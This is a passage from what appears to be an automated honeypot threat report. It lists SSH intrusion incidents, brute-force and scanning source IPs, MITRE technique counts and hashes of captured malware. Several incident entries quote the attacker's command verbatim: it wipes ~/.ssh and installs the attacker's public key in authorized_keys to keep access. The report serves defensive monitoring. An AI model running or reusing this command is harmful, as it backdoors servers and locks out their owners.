- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df86e4435249

| Field | Detail |
|---|---|
| **Source IP** | `212.199.105[.]109` |
| **First Seen** | 2026-06-02 10:34 |
| **Last Seen** | 2026-06-02 10:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:34:29` | `cowrie.session.connect` |
| `2026-06-02 10:34:29` | `cowrie.client.version` |
| `2026-06-02 10:34:29` | `cowrie.client.kex` |
| `2026-06-02 10:34:30` | `cowrie.login.success` |
| `2026-06-02 10:34:30` | `cowrie.session.params` |
| `2026-06-02 10:34:30` | `cowrie.command.input` |
| `2026-06-02 10:34:30` | `cowrie.command.failed` |
| `2026-06-02 10:34:30` | `cowrie.log.closed` |
| `2026-06-02 10:34:31` | `cowrie.session.params` |
| `2026-06-02 10:34:31` | `cowrie.command.input` |
| `2026-06-02 10:34:31` | `cowrie.session.file_download` |
| `2026-06-02 10:34:31` | `cowrie.log.closed` |
| `2026-06-02 10:34:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.199.105[.]109` to AbuseIPDB if not already reported
- [ ] Block `212.199.105[.]109` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2424a5a9f11e

| Field | Detail |
|---|---|
| **Source IP** | `212.199.105[.]109` |
| **First Seen** | 2026-06-02 10:34 |
| **Last Seen** | 2026-06-02 10:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:34:34` | `cowrie.session.connect` |
| `2026-06-02 10:34:34` | `cowrie.client.version` |
| `2026-06-02 10:34:34` | `cowrie.client.kex` |
| `2026-06-02 10:34:35` | `cowrie.login.success` |
| `2026-06-02 10:34:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.199.105[.]109` to AbuseIPDB if not already reported
- [ ] Block `212.199.105[.]109` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c03908f4e837

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-06-02 10:36 |
| **Last Seen** | 2026-06-02 10:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:36:59` | `cowrie.session.connect` |
| `2026-06-02 10:36:59` | `cowrie.client.version` |
| `2026-06-02 10:37:00` | `cowrie.client.kex` |
| `2026-06-02 10:37:00` | `cowrie.login.success` |
| `2026-06-02 10:37:01` | `cowrie.session.params` |
| `2026-06-02 10:37:01` | `cowrie.command.input` |
| `2026-06-02 10:37:01` | `cowrie.command.failed` |
| `2026-06-02 10:37:01` | `cowrie.log.closed` |
| `2026-06-02 10:37:02` | `cowrie.session.params` |
| `2026-06-02 10:37:02` | `cowrie.command.input` |
| `2026-06-02 10:37:02` | `cowrie.session.file_download` |
| `2026-06-02 10:37:02` | `cowrie.log.closed` |
| `2026-06-02 10:37:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dd9938079c5

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-06-02 10:37 |
| **Last Seen** | 2026-06-02 10:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:37:04` | `cowrie.session.connect` |
| `2026-06-02 10:37:04` | `cowrie.client.version` |
| `2026-06-02 10:37:05` | `cowrie.client.kex` |
| `2026-06-02 10:37:05` | `cowrie.login.success` |
| `2026-06-02 10:37:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9dc3b23d3fb

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-06-02 10:40 |
| **Last Seen** | 2026-06-02 10:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:40:29` | `cowrie.session.connect` |
| `2026-06-02 10:40:29` | `cowrie.client.version` |
| `2026-06-02 10:40:29` | `cowrie.client.kex` |
| `2026-06-02 10:40:30` | `cowrie.login.success` |
| `2026-06-02 10:40:31` | `cowrie.session.params` |
| `2026-06-02 10:40:31` | `cowrie.command.input` |
| `2026-06-02 10:40:31` | `cowrie.command.failed` |
| `2026-06-02 10:40:31` | `cowrie.log.closed` |
| `2026-06-02 10:40:31` | `cowrie.session.params` |
| `2026-06-02 10:40:31` | `cowrie.command.input` |
| `2026-06-02 10:40:31` | `cowrie.session.file_download` |
| `2026-06-02 10:40:31` | `cowrie.log.closed` |
| `2026-06-02 10:40:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ea9e824c3dc

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-06-02 10:40 |
| **Last Seen** | 2026-06-02 10:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 10:40:34` | `cowrie.session.connect` |
| `2026-06-02 10:40:34` | `cowrie.client.version` |
| `2026-06-02 10:40:34` | `cowrie.client.kex` |
| `2026-06-02 10:40:35` | `cowrie.login.success` |
| `2026-06-02 10:40:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `137.184.204[.]8` | **377** | 2026-06-02 04:16 | 2026-06-02 10:41 | 343m | 0 | `T1592` | 🟠 MEDIUM |
| `152.32.189[.]59` | **30** | 2026-06-02 09:11 | 2026-06-02 09:59 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `183.91.11[.]36` | **30** | 2026-06-02 09:42 | 2026-06-02 10:42 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `212.199.105[.]109` | **30** | 2026-06-02 09:48 | 2026-06-02 10:34 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `45.120.115[.]150` | **30** | 2026-06-02 07:01 | 2026-06-02 07:54 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `92.204.138[.]44` | **30** | 2026-06-02 05:05 | 2026-06-02 08:39 | 15m | 0 | `T1592` | 🟠 MEDIUM |
| `172.203.134[.]70` | **23** | 2026-06-02 07:12 | 2026-06-02 08:50 | 0m | 22 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `180.100.217[.]164` | **23** | 2026-06-02 07:10 | 2026-06-02 08:12 | 32m | 5 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `170.168.72[.]153` | **20** | 2026-06-02 07:43 | 2026-06-02 08:28 | 1m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `178.105.84[.]57` | **20** | 2026-06-02 07:46 | 2026-06-02 08:15 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `106.12.43[.]166` | **19** | 2026-06-02 04:17 | 2026-06-02 04:53 | 30m | 0 | `T1592` | 🟠 MEDIUM |
| `190.244.39[.]224` | **18** | 2026-06-02 05:47 | 2026-06-02 07:31 | 0m | 18 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.14.33[.]174` | **15** | 2026-06-02 09:59 | 2026-06-02 10:26 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `175.24.174[.]240` | **15** | 2026-06-02 09:25 | 2026-06-02 10:04 | 22m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.190.214[.]241` | **13** | 2026-06-02 04:57 | 2026-06-02 05:56 | 0m | 13 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `120.48.13[.]223` | **13** | 2026-06-02 08:56 | 2026-06-02 09:26 | 13m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.237.144[.]204` | **12** | 2026-06-02 04:55 | 2026-06-02 06:02 | 0m | 12 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `187.51.208[.]158` | **8** | 2026-06-02 07:47 | 2026-06-02 08:04 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `190.181.27[.]27` | **6** | 2026-06-02 07:47 | 2026-06-02 08:00 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `152.32.175[.]179` | **4** | 2026-06-02 09:28 | 2026-06-02 09:33 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `180.178.94[.]214` | **4** | 2026-06-02 04:58 | 2026-06-02 05:08 | 2m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `192.169.179[.]77` | **4** | 2026-06-02 09:18 | 2026-06-02 09:20 | 2m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]180` | **4** | 2026-06-02 06:36 | 2026-06-02 06:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `128.78.143[.]196` | **3** | 2026-06-02 08:23 | 2026-06-02 08:33 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `57.128.225[.]99` | **3** | 2026-06-02 07:42 | 2026-06-02 07:52 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `62.132.18[.]142` | **3** | 2026-06-02 07:42 | 2026-06-02 07:53 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `16.59.45[.]56` | **2** | 2026-06-02 08:11 | 2026-06-02 08:15 | 0m | 0 | `T1592` | 🟢 LOW |
| `167.172.187[.]11` | **2** | 2026-06-02 08:10 | 2026-06-02 08:20 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `171.244.142[.]205` | **2** | 2026-06-02 08:23 | 2026-06-02 08:27 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `199.45.155[.]77` | **2** | 2026-06-02 06:25 | 2026-06-02 06:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.138.155[.]43` | **2** | 2026-06-02 10:19 | 2026-06-02 10:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `94.102.56[.]99` | **2** | 2026-06-02 08:18 | 2026-06-02 08:18 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `1.202.220[.]94` | 1 | 2026-06-02 08:13 | 2026-06-02 08:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.126.155[.]86` | 1 | 2026-06-02 04:54 | 2026-06-02 04:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.126.23[.]159` | 1 | 2026-06-02 09:13 | 2026-06-02 09:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `103.41.247[.]76` | 1 | 2026-06-02 04:52 | 2026-06-02 04:52 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.69.96[.]120` | 1 | 2026-06-02 09:08 | 2026-06-02 09:08 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `114.132.126[.]52` | 1 | 2026-06-02 09:48 | 2026-06-02 09:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `119.96.173[.]169` | 1 | 2026-06-02 09:44 | 2026-06-02 09:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `131.196.14[.]35` | 1 | 2026-06-02 05:00 | 2026-06-02 05:00 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `135.148.33[.]168` | 1 | 2026-06-02 05:07 | 2026-06-02 05:07 | 39s | 0 | `T1592` | 🟢 LOW |
| `144.48.130[.]2` | 1 | 2026-06-02 10:32 | 2026-06-02 10:32 | 12s | 0 | `T1592` | 🟢 LOW |
| `167.71.16[.]202` | 1 | 2026-06-02 06:38 | 2026-06-02 06:38 | 10s | 0 | `T1592` | 🟢 LOW |
| `170.238.203[.]112` | 1 | 2026-06-02 04:28 | 2026-06-02 04:28 | 13s | 0 | `T1592` | 🟢 LOW |
| `181.115.208[.]189` | 1 | 2026-06-02 09:38 | 2026-06-02 09:38 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `182.191.77[.]164` | 1 | 2026-06-02 05:45 | 2026-06-02 05:45 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `187.210.77[.]100` | 1 | 2026-06-02 09:43 | 2026-06-02 09:43 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `190.61.55[.]153` | 1 | 2026-06-02 05:03 | 2026-06-02 05:03 | 13s | 0 | `T1592` | 🟢 LOW |
| `196.191.231[.]12` | 1 | 2026-06-02 06:47 | 2026-06-02 06:47 | 13s | 0 | `T1592` | 🟢 LOW |
| `202.184.134[.]88` | 1 | 2026-06-02 05:44 | 2026-06-02 05:44 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `211.228.218[.]47` | 1 | 2026-06-02 05:00 | 2026-06-02 05:00 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `212.19.7[.]249` | 1 | 2026-06-02 05:16 | 2026-06-02 05:17 | 31s | 0 | `T1592` | 🟢 LOW |
| `212.87.199[.]64` | 1 | 2026-06-02 08:15 | 2026-06-02 08:15 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `38.22.170[.]10` | 1 | 2026-06-02 09:45 | 2026-06-02 09:45 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `39.171.240[.]69` | 1 | 2026-06-02 04:52 | 2026-06-02 04:52 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `43.157.163[.]155` | 1 | 2026-06-02 04:56 | 2026-06-02 04:56 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `5.226.140[.]116` | 1 | 2026-06-02 05:56 | 2026-06-02 05:56 | 10s | 0 | `T1592` | 🟢 LOW |
| `58.56.200[.]238` | 1 | 2026-06-02 09:11 | 2026-06-02 09:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `59.126.16[.]66` | 1 | 2026-06-02 04:42 | 2026-06-02 04:43 | 30s | 0 | `T1592` | 🟢 LOW |
| `59.36.78[.]66` | 1 | 2026-06-02 07:00 | 2026-06-02 07:00 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `64.227.101[.]30` | 1 | 2026-06-02 08:01 | 2026-06-02 08:02 | 42s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-06-02 07:42 | 2026-06-02 07:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]236` | 1 | 2026-06-02 08:37 | 2026-06-02 08:38 | 15s | 0 | `T1592` | 🟢 LOW |
| `68.151.1[.]196` | 1 | 2026-06-02 04:38 | 2026-06-02 04:38 | 13s | 0 | `T1592` | 🟢 LOW |
| `69.5.169[.]84` | 1 | 2026-06-02 05:34 | 2026-06-02 05:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `8.222.159[.]179` | 1 | 2026-06-02 04:58 | 2026-06-02 04:59 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (32 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 37/100 | 🟢 LOW | **18/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 35/100 | 🟢 LOW | **14/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 37/100 | 🟢 LOW | **19/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 37/100 | 🟢 LOW | **19/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `114.132.126[.]52` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 0 |
| `170.238.203[.]112` | CL | BITRED GROUP SPA | **100** ⚠️ | 2 |
| `66.132.224[.]236` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `120.48.13[.]223` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 3 |
| `190.244.39[.]224` | AR | Telecom Argentina S.A. | **100** ⚠️ | 45 |
| `144.48.130[.]2` | PK | Cyber Internet Services Pakistan | **100** ⚠️ | 8 |
| `180.178.94[.]214` | ID | PT Widya Intersat Nusantara | **100** ⚠️ | 3 |
| `38.22.170[.]10` | MX | FIBERWIFI SA DE CV | **100** ⚠️ | 31 |
| `62.132.18[.]142` | US | GTT Communications Inc. | **100** ⚠️ | 26 |
| `43.157.163[.]155` | BR | Asia Pacific Network Information Center, Pty. Ltd. | **100** ⚠️ | 23 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 537 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 299 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 175 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 89 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 89 |

---

## 🔕 False Positive Summary (21 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| AbuseIPDB score 4 below threshold 25 | 3 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 12 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 999 cases |
| Tool 34  | Credential Extractor        | ✅ 476 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 7 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 77 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 21 filtered (2.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 57 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 32 files |
